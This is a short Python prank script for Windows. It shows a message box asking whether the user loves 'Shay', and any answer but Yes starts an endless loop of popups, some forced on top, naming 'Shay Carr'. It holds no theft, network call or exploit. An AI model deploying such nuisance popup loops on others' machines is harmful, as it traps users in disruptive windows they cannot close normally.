# Loading Important Stuff
import time
import ctypes
import ctypes.wintypes as w
MB_ICONQUESTION = 0x00000020
MB_ICONWARNING = 0x00000030
MB_YESNO = 0x00000004
MB_OK = 0x00000000
MB_HELP = 0x00004000
MB_TOPMOST = 0x00040000


# Loaded

response = ctypes.windll.user32.MessageBoxW(None, 'Do you love shay?', 'The Big Shay', MB_ICONWARNING | MB_YESNO)


if response == 6:  # User clicked "Yes"
    ctypes.windll.user32.MessageBoxW(None, 'Shay Approves', 'The Big Shay', MB_ICONWARNING | MB_OK)
else:
    while True:
        ctypes.windll.user32.MessageBoxW(None, 'I love shay', 'The Big Shay', MB_ICONWARNING | MB_OK)
        ctypes.windll.user32.MessageBoxW(None, 'Will you be my shay', 'The Big Shay', MB_ICONQUESTION | MB_OK)
        ctypes.windll.user32.MessageBoxW(None, 'Shay is the greatest', 'The Big Shay', MB_ICONWARNING | MB_OK | MB_TOPMOST)
        ctypes.windll.user32.MessageBoxW(None, 'Shay Shay Shay Shay Shay Shay Shay Shay Shay ', 'The Big Shay', MB_ICONQUESTION | MB_HELP)
        ctypes.windll.user32.MessageBoxW(None, 'Shay Carr', 'The Big Shay', MB_ICONWARNING | MB_OK | MB_TOPMOST)

